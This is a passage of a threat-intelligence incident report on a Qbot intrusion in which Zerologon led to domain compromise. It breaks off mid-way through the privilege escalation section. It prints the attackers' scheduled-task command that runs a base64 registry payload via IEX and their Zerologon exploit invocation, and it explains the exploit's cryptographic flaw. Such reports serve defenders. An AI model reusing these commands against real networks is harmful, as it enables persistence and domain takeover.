		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>								</nav><!-- #site-navigation -->
            			</div>
        				</div><!-- .wrap -->
     				</div><!-- .navigation-top -->
				<div class="clock"> 
					<div id="time"></div>
					<div id="date">Wednesday, December 18, 2024</div>
				</div>
				</div><!-- #nav-sticker -->
				       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			</div><!-- .main-header-brand -->
						
							</div><!-- .main-header -->
	</header><!-- #masthead -->

	<div id="content" class="site-content">
		<div class="site-content-cell">
						<div class="wrap wrap-width">

	<div id="primary" class="content-area">
		<main id="main" class="site-main">

		
<article id="post-5552" class="post-5552 post type-post status-publish format-standard hentry category-adfind category-cobaltstrike category-qbot entry">
	
	<div class="entry-content-holder">
		<header class="entry-header">

		
				<div class="entry-meta">

					
		<span class="cat-links">
		
			<a class="category-color-24" href="https://thedfirreport.com/category/adfind/">adfind</a>
		
			<a class="category-color-6" href="https://thedfirreport.com/category/cobaltstrike/">cobaltstrike</a>
		
			<a class="category-color-91" href="https://thedfirreport.com/category/qbot/">Qbot</a>
				</span>
	
				</div><!-- .entry-meta -->
			<h1 class="entry-title">Qbot and Zerologon Lead To Full Domain Compromise</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/" rel="bookmark"><time class="entry-date published" datetime="2022-02-21T02:04:48+00:00">February 21, 2022</time></a></span>		</div><!-- .entry-meta -->

		
	</header><!-- .entry-header -->

	<div class="entry-content">
		<div class="ql-block" data-block-id="block-a2c54950-1c70-48f5-8c0c-15b91db95ce4">In this intrusion (from November 2021), a threat actor gained its initial foothold in the environment through the use of <a class="ql-link" href="https://malpedia.caad.fkie.fraunhofer.de/details/win.qakbot" target="_blank" rel="noopener noreferrer"><span class="ql-comment" data-comment-ids="985588410" data-comment-unresolved-ids="">Qbot</span></a> <span data-void-detect="true"><span class="ql-comment" data-comment-ids="985588410" data-comment-unresolved-ids="">(a.k.a. Quakbot/Qakbot)</span></span> malware.</div>
<div class="ql-block" data-block-id="block-d0235005-76bb-4cbe-8b7a-540f15983de0"></div>
<p class="ql-block" data-block-id="block-98598af3-fe7a-4684-9992-ed32bad99f5b">Soon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the <a class="ql-link" href="https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/" target="_blank" rel="noopener noreferrer"><span class="ql-comment" data-comment-ids="985588397" data-comment-unresolved-ids="">Zerologon</span></a><span data-void-detect="true"><span class="ql-comment" data-comment-ids="985588397" data-comment-unresolved-ids=""> vulnerability (CVE-2020-1472)</span></span> allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat actor then exfiltrated sensitive documents from the environment before being evicted from the network.</p>
<h3 class="ql-block" data-block-id="block-98598af3-fe7a-4684-9992-ed32bad99f5b">Summary</h3>
<p class="ql-block" data-block-id="block-371028ff-b836-4112-8790-86459dc68828">The threat actors gained initial access to a Windows workstation through the execution of a malicious DLL. The first activity of QBot was seen 5 minutes after the DLL was executed. Various automated discovery commands were used to<span class="ql-comment" data-comment-ids="985558993" data-comment-unresolved-ids=""> map the network topology, retrieve local group member information, and list available file shares/privileges of the infected user. </span></p>
<div class="ql-block" data-block-id="block-c1596d8f-40ab-406a-a6a4-b20448f91e4a"></div>
<div class="ql-block" data-block-id="block-1d46d07d-a710-4758-bd3f-668f1a7b1919">Following the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence. <span class="ql-comment" data-comment-ids="985558997" data-comment-unresolved-ids="">The scheduled task&#8217;s primary purpose was to execute a (base64-encoded) PowerShell Cobalt Strike beacon every 30 minutes. </span></div>
<div class="ql-block" data-block-id="block-9622c5b5-fc90-4e40-a59a-816960d34227"></div>
<div class="ql-block" data-block-id="block-3ca5af55-c69f-43c8-bc94-aa8730940b2b">Once the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as N<span class="ql-comment" data-comment-ids="985559607" data-comment-unresolved-ids="">ltest, net and ADFind.</span></div>
<div class="ql-block" data-block-id="block-a54fe47f-d0ea-405b-ab6e-765b94da952c"></div>
<div class="ql-block" data-block-id="block-160b500a-6f7c-4d97-86ca-db41343e8664">Upon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability. The executable used bears striking similarity to the one used in a previous case <a class="ql-link" href="https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/" target="_blank" rel="noopener noreferrer"><span class="ql-comment" data-comment-ids="985581977" data-comment-unresolved-ids="">From Zero to Domain Admin</span></a><span data-void-detect="true"><span class="ql-comment" data-comment-ids="985581977" data-comment-unresolved-ids=""> based on command line arguments and the overall execution of the exploit.</span> The executable named </span>cool.exe <span class="ql-comment" data-comment-ids="985588307" data-comment-unresolved-ids="">resets the domain controller password</span> to an empty string, retrieves the Domain Admin password Hash, and <span class="ql-comment" data-comment-ids="985683827" data-comment-unresolved-ids="">installs a service on the DC to reset the DC password so as to not break Active Directory operations.</span></div>
<div class="ql-block" data-block-id="block-7bd34fad-ffe6-4c8f-8307-594a1ef6de9a"></div>
<div class="ql-block" data-block-id="block-7a195948-79a2-4fcd-8fca-128353547e59">The domain admin hash was then used on the beachhead through an <span style="color: #000000;">over-pass-the-hash attack</span>. After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers.</div>
<div class="ql-block" data-block-id="block-dcda7306-d331-493c-8adc-f2b11999a657"></div>
<p class="ql-block" data-block-id="block-667a18a3-1d7e-41d4-a527-09600fc26aa2"><span class="ql-comment" data-comment-ids="985560365" data-comment-unresolved-ids="">Finally, documents were stolen and exfiltrated through Cobalt Strike encrypted C2 channel (HTTPS)</span>. To conclude this case, the threat actors were evicted from the network before they completed any further objectives.</p>
<h3 class="ql-heading" data-block-id="block-3ed29d3c-6bc3-44c3-bf1c-c3159a11354c">Services</h3>
<p class="ql-block" data-block-id="block-17c98bc6-199c-4b0f-a5e3-5bb88bec204c">We offer multiple services including a <a class="ql-link" href="https://thedfirreport.com/services/" target="_blank" rel="noopener noreferrer">Threat Feed service</a><span data-void-detect="true"> which tracks Command and Control frameworks such as QBot, Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found </span><a class="ql-link" href="https://thedfirreport.com/services/" target="_blank" rel="noopener noreferrer">here</a><span data-void-detect="true">.</span></p>
<div class="ql-block" data-block-id="block-aeacdb04-b05f-4fd3-9f4f-04a153fcbf64"></div>
<p class="ql-block" data-block-id="block-021cf5a9-94fb-42a6-83b6-8e3386a1aefa">We also have artifacts and IOCs available from this case such as memory captures, files, event logs including Sysmon, Kape packages, and more, under our <a class="ql-link" href="https://www.patreon.com/thedfirreport" target="_blank" rel="noopener noreferrer">Security Researcher and Organization</a><span data-void-detect="true"> services.</span></p>
<h3><span class="ql-comment" data-comment-ids="997529436" data-comment-unresolved-ids="">Timeline</span></h3>
<p class="ql-block" data-block-id="block-2ea62f12-06dc-4bf4-a339-15fd5987651e"><img fetchpriority="high" decoding="async" class="size-full wp-image-5605 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/Qbot-and-Zerologon-Lead-To-Full-Domain-Compromise.png" alt="" width="1175" height="2422" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/Qbot-and-Zerologon-Lead-To-Full-Domain-Compromise.png 1175w, https://thedfirreport.com/wp-content/uploads/2022/02/Qbot-and-Zerologon-Lead-To-Full-Domain-Compromise-146x300.png 146w, https://thedfirreport.com/wp-content/uploads/2022/02/Qbot-and-Zerologon-Lead-To-Full-Domain-Compromise-497x1024.png 497w, https://thedfirreport.com/wp-content/uploads/2022/02/Qbot-and-Zerologon-Lead-To-Full-Domain-Compromise-768x1583.png 768w, https://thedfirreport.com/wp-content/uploads/2022/02/Qbot-and-Zerologon-Lead-To-Full-Domain-Compromise-745x1536.png 745w, https://thedfirreport.com/wp-content/uploads/2022/02/Qbot-and-Zerologon-Lead-To-Full-Domain-Compromise-994x2048.png 994w" sizes="(max-width: 1175px) 100vw, 1175px" /></p>
<p class="ql-block" data-block-id="block-79c26d00-f101-4d51-b61a-4c0dabf5ebdf">Analysis and reporting completed by <a class="ql-link" href="https://twitter.com/pigerlin" target="_blank" rel="noopener noreferrer"><span contenteditable="false">@pigerlin</span></a> &amp; <a class="ql-link" href="https://twitter.com/MetallicHack" target="_blank" rel="noopener noreferrer">@MetallicHack</a></p>
<p class="ql-block" data-block-id="block-62261efb-8948-4c86-a79c-b1cec576af03">Reviewed by <a class="ql-link" href="https://twitter.com/IcsNick" target="_blank" rel="noopener noreferrer">@ICSNick</a><span data-void-detect="true"> &amp; </span><a class="ql-link" href="https://twitter.com/Kostastsale" target="_blank" rel="noopener noreferrer">@kostastsale</a></p>
<div class="ql-block" data-block-id="block-ba3789db-eb83-4893-97a0-979524b5580c"></div>
<h3 class="ql-heading" data-block-id="block-f79aba2e-c5a4-476d-b679-52f24834f392">Initial Access</h3>
<div class="ql-block" data-block-id="block-b879ea62-d80e-4ad2-8980-4c851f4ff077">The threat actor gained their initial access through the execution of a malicious DLL. Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL. In this case, however, the execution started directly from the qbot DLL found <a class="ql-link" href="https://tria.ge/211115-r554waafe6" target="_blank" rel="noopener noreferrer">here</a><span data-void-detect="true">.</span></div>
<div class="ql-block" data-block-id="block-3dd99b13-5249-4782-b3d7-4305d8322037"></div>
<div class="ql-block" data-block-id="block-217b79bf-247c-4417-ab70-02537670d7f4">The execution chain for this QBot infection can be seen below:</div>
<div class="ql-block" data-block-id="block-afd686b7-8f61-4971-bea0-39ce75ef6a99"></div>
<div class="ql-block" data-block-id="block-28d94f2f-bd45-468b-aa4d-73a8ed281c1e"><img decoding="async" class="alignnone size-full wp-image-5673" src="https://thedfirreport.com/wp-content/uploads/2022/02/qbot_chain.png" alt="" width="2011" height="858" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/qbot_chain.png 2011w, https://thedfirreport.com/wp-content/uploads/2022/02/qbot_chain-300x128.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/qbot_chain-1024x437.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/qbot_chain-768x328.png 768w, https://thedfirreport.com/wp-content/uploads/2022/02/qbot_chain-1536x655.png 1536w" sizes="(max-width: 2011px) 100vw, 2011px" /></div>
<div class="ql-block" data-block-id="block-91b63f86-f94a-4b1c-9f36-846ffbb1fc44"></div>
<h3 class="ql-heading" data-block-id="block-a3f78813-b1d2-4da7-931b-aa389d02e2e9">Execution</h3>
<h4 class="ql-heading" data-block-id="block-2e79a1df-64b6-476f-97b5-2eb2b62bd531">QBot PowerShell analysis</h4>
<div class="ql-block" data-block-id="block-23e080e1-a7fa-4d3f-b60e-9df6b7568219">We analyzed the registry path and associated keys that were queried by the scheduled task <code>HKCU:\SOFTWARE\Pvoeooxf</code> and discovered that three keys were created containing base64 encoded values. Decoding the values resulted in:</div>
<div class="ql-block" data-block-id="block-6715f3a9-612e-4a5e-823a-1d0e806c2a3a">1. Copy of QBot DLL</div>
<div class="ql-block" data-block-id="block-7e5f1a5f-dd6d-4ef1-9557-84ad1d7363fb"><span class="ql-comment" data-comment-ids="482463901" data-comment-unresolved-ids="">2. String of QBot C2 IP-addresses separated by a semicolon.</span></div>
<div class="ql-block" data-block-id="block-5c256349-bcf4-4d0d-9c36-e19536416ea7">3. Obfuscated PowerShell script that is referenced by the scheduled task.</div>
<div class="ql-block" data-block-id="block-77d64733-55ca-4ec4-8417-fc00937f1549"></div>
<div class="ql-block" data-block-id="block-ba310fe4-320c-443a-9519-e285b57b80fc"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-02.png"><img decoding="async" class="size-full wp-image-5557 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-02.png" alt="" width="1077" height="115" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-02.png 1077w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-02-300x32.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-02-1024x109.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-02-768x82.png 768w" sizes="(max-width: 1077px) 100vw, 1077px" /></a></div>
<div data-block-id="block-ba310fe4-320c-443a-9519-e285b57b80fc"></div>
<div data-block-id="block-ba310fe4-320c-443a-9519-e285b57b80fc"></div>
<div class="ql-block" data-block-id="block-2f32bf9c-22dd-478d-a017-12b090f6454b">The PowerShell script (triggered by the scheduled task) starts off a chain of events which is illustrated below:</div>
<div class="ql-block" data-block-id="block-650e0172-1e9d-4c9a-9547-d04c9462b71c"> <a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-03.png"><img loading="lazy" decoding="async" class="size-full wp-image-5559 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-03.png" alt="" width="1253" height="556" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-03.png 1253w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-03-300x133.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-03-1024x454.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-03-768x341.png 768w" sizes="auto, (max-width: 1253px) 100vw, 1253px" /></a></div>
<div class="ql-block" data-block-id="block-fb9d6866-358c-4750-826a-b4921205ff31"></div>
<p class="ql-block" data-block-id="block-64149435-1bf9-4dc5-825b-cc2b83c64217">When run for the first time, the script creates a new registry key entry in the same path, saving the date of execution. It then verifies upon execution if the creation date key of this registry key is older than 4 hours.</p>
<p class="ql-block" data-block-id="block-25b2e21b-59b4-4d8c-a48a-bfc05cdb4ea4"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-04.png"><img loading="lazy" decoding="async" class="size-full wp-image-5560 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-04.png" alt="" width="1192" height="340" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-04.png 1192w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-04-300x86.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-04-1024x292.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-04-768x219.png 768w" sizes="auto, (max-width: 1192px) 100vw, 1192px" /></a></p>
<p>Based on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.</p>
<p class="ql-block" data-block-id="block-791d3360-b267-48c6-bced-8038eaa32493"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-05.png"><img loading="lazy" decoding="async" class="size-full wp-image-5561 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-05.png" alt="" width="728" height="179" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-05.png 728w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-05-300x74.png 300w" sizes="auto, (max-width: 728px) 100vw, 728px" /></a></p>
<p>OR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the <code>Invoke-WebRequest</code> PowerShell module:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-06.png"><img loading="lazy" decoding="async" class="size-full wp-image-5562 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-06.png" alt="" width="885" height="243" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-06.png 885w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-06-300x82.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-06-768x211.png 768w" sizes="auto, (max-width: 885px) 100vw, 885px" /></a></p>
<p>The PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files.</p>
<p class="ql-block" data-block-id="block-ab7d7378-dca6-4595-9184-f69375ff99c4"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-07.png"><img loading="lazy" decoding="async" class="size-full wp-image-5563 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-07.png" alt="" width="1090" height="705" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-07.png 1090w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-07-300x194.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-07-1024x662.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-07-768x497.png 768w" sizes="auto, (max-width: 1090px) 100vw, 1090px" /></a></p>
<div data-block-id="block-ab7d7378-dca6-4595-9184-f69375ff99c4"></div>
<p class="ql-block" data-block-id="block-2f48a585-01fe-4cee-9708-d3bdceb0e537">The encoded QBot DLL that was stored in the registry, was dropped in the directory <code>%APPDATA%\Roaming\Microsoft\Fdopitcu</code>. The unsigned DLL, with descriptor <code>Cancel Autoplay 2</code> was executed using <code>regsvr32.exe</code></p>
<p class="ql-block" data-block-id="block-3f963dae-bfb4-4e17-a56b-85d5ff0e2b43"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-08.png"><img loading="lazy" decoding="async" class="size-full wp-image-5564 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-08.png" alt="" width="887" height="659" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-08.png 887w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-08-300x223.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-08-768x571.png 768w" sizes="auto, (max-width: 887px) 100vw, 887px" /></a></p>
<p class="ql-block" data-block-id="block-ca63ccdf-c98c-4b08-bfa6-ffb5975dcb5e"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-09.png"><img loading="lazy" decoding="async" class="size-full wp-image-5565 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-09.png" alt="" width="1443" height="325" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-09.png 1443w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-09-300x68.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-09-1024x231.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-09-768x173.png 768w" sizes="auto, (max-width: 1443px) 100vw, 1443px" /></a></p>
<p class="ql-block" data-block-id="block-fe598404-cfca-4b2e-9df7-23ef12308793">Upon execution of this second-stage DLL, various registry keys were created in <code>HKCU\Software\Microsoft\Yerqbqokc.</code>In addition, a new instance of explorer.exe (32-bit) was started and injected into.</p>
<p class="ql-block" data-block-id="block-fe598404-cfca-4b2e-9df7-23ef12308793"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-10.png"><img loading="lazy" decoding="async" class="size-full wp-image-5566 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-10.png" alt="" width="1806" height="1089" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-10.png 1806w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-10-300x181.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-10-1024x617.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-10-768x463.png 768w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-10-1536x926.png 1536w" sizes="auto, (max-width: 1806px) 100vw, 1806px" /></a></p>
<p class="ql-block" data-block-id="block-0d8551b1-d924-4084-a3b9-07d32f37f9c1">The registry keys contain eight-character long hex strings for which we believe is part of the malware&#8217;s encrypted <a class="ql-link" href="https://www.binarydefense.com/qakbot-upgrades-to-stealthier-persistence-method/" target="_blank" rel="noopener noreferrer">config</a><span data-void-detect="true">.</span></p>
<div class="ql-block" data-block-id="block-0f4fa28c-a856-43c7-90c2-64b3a9c2901f"></div>
<div class="ql-block" data-block-id="block-529e03fb-ddaa-4dd6-8953-ec62ff131d92"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-11.png"><img loading="lazy" decoding="async" class="size-full wp-image-5567 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-11.png" alt="" width="691" height="339" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-11.png 691w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-11-300x147.png 300w" sizes="auto, (max-width: 691px) 100vw, 691px" /></a></div>
<h3 data-block-id="block-00bcf24f-49ac-4407-9f21-3dceccc93d48"></h3>
<h3 class="ql-heading" data-block-id="block-00bcf24f-49ac-4407-9f21-3dceccc93d48">Persistence</h3>
<h4 class="ql-heading" data-block-id="block-77adae51-cd2b-46d1-99ac-8adee82a1d89">Scheduled Task/Job &#8211; Scheduled Task On Beachhead</h4>
<div class="ql-block" data-block-id="block-83d7ba9f-535b-4635-b90d-178a91b6a29b">The scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry.</div>
<pre>schtasks.exe /Create /F /TN "{97F2F70B-10D1-4447-A2F3-9B070C86E261}" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\Pvoeooxf).yzbbvhhdypa))) " /SC MINUTE /MO 30</pre>
<div class="ql-block" data-block-id="block-da05d02c-5790-4580-8a4b-e69371c78c0b"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-12.png"><img loading="lazy" decoding="async" class="size-full wp-image-5568 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-12.png" alt="" width="846" height="280" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-12.png 846w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-12-300x99.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-12-768x254.png 768w" sizes="auto, (max-width: 846px) 100vw, 846px" /></a></div>
<div data-block-id="block-da05d02c-5790-4580-8a4b-e69371c78c0b"></div>
<pre>LogName: Microsoft-Windows-TaskScheduler/Operational 
EventCode: 106
Message: Task scheduler Task Registered</pre>
<h3 class="ql-heading" data-block-id="block-aef9c9ae-5b5a-47f5-9bd5-90ce5c82d114">Privilege Escalation</h3>
<p class="ql-block" data-block-id="block-d2bcf5f5-ba54-4775-aed6-4c577e1da50c">Thirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon.</p>
<p class="ql-block" data-block-id="block-4657c574-0d77-48e3-b4af-542fc2c6dcf3"><span class="ql-comment" data-comment-ids="488412840" data-comment-unresolved-ids="">The executable was named &#8220;cool.exe&#8221; :</span></p>
<pre>C:\Windows\system32\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c "taskkill /f /im explorer.exe"</pre>
<p class="ql-block" data-block-id="block-8924b528-286b-44a0-9eda-e0bc240b1083"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-13.png"><img loading="lazy" decoding="async" class="size-full wp-image-5569 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-13.png" alt="" width="1575" height="349" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-13.png 1575w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-13-300x66.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-13-1024x227.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-13-768x170.png 768w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-13-1536x340.png 1536w" sizes="auto, (max-width: 1575px) 100vw, 1575px" /></a></p>
<p class="ql-block" data-block-id="block-44e5bead-996f-41db-846c-0abaa642f433">Three milliseconds after the <a class="ql-link" href="https://blogs.blackberry.com/en/2021/03/zerologon-to-ransomware" target="_blank" rel="noopener noreferrer"><span class="ql-comment" data-comment-ids="985565645" data-comment-unresolved-ids="">Zerologon</span></a> exploit<span data-void-detect="true">, an event 4742 &#8220;A computer account was changed.&#8221; was generated on the targeted Domain Controller.</span></p>
<p class="ql-block" data-block-id="block-c2e95e04-6a6b-4442-8d16-8da3ef188726">As explained in a detailed blog from <a class="ql-link" href="https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/" target="_blank" rel="noopener noreferrer">CrowdStrike</a><span data-void-detect="true">, the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV :</span></p>
<blockquote class="ql-quote" data-block-id="block-8a71eb50-8662-401d-8789-e19727824e05"><p>&#8220;In order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key. However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes. This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256. Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren’t rejected by servers (by default). The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.&#8221;</p></blockquote>
<p>As we can see on the network captures, a brute-force attack was performed in order to spoof the identity of the domain controller :</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-14.png"><img loading="lazy" decoding="async" class="size-full wp-image-5570 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-14.png" alt="" width="1544" height="1200" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-14.png 1544w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-14-300x233.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-14-1024x796.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-14-768x597.png 768w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-14-1536x1194.png 1536w" sizes="auto, (max-width: 1544px) 100vw, 1544px" /></a></p>
<p>After the end of the brute force traffic, we can see a single instance where a the exploit has completed successfully.</p>
<p class="ql-block" data-block-id="block-1851bb6e-87f4-4ce4-938d-8264d86854e6"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-15.png"><img loading="lazy" decoding="async" class="size-full wp-image-5571 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-15.png" alt="" width="1055" height="287" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-15.png 1055w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-15-300x82.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-15-1024x279.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-15-768x209.png 768w" sizes="auto, (max-width: 1055px) 100vw, 1055px" /></a></p>
<p>After being successfully authenticated, the DC password was set:</p>
